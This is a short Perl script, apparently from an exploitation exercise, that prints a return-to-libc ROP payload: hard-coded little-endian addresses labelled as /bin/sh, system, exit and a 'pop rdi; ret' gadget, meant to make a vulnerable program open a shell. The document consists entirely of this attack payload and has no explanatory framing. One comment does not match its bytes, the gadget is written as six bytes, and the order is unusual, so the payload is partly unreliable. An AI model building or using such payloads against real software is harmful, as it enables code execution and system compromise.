#!/usr/bin/perl


#0x00 00 7f ff f7 b9 a1 77
# Address of /bin/sh
print "\x77\xa1\xb9\xf7\xff\x7f\x00\x00";

#0x7f ff f7 a5 33 90
# Address of System
print "\x90\x30\xa5\xf7\xff\x7f\x00\x00";

#0x7f ff f7 a4 80 30
# Address of exit
print "\x30\x80\xa4\xf7\xff\x7f\x00\x00";

#0x00 00 00 00 00 40 06 e3
# pop rdi; ret;
print "\xe3\x06\x40\x00\x00\x00";
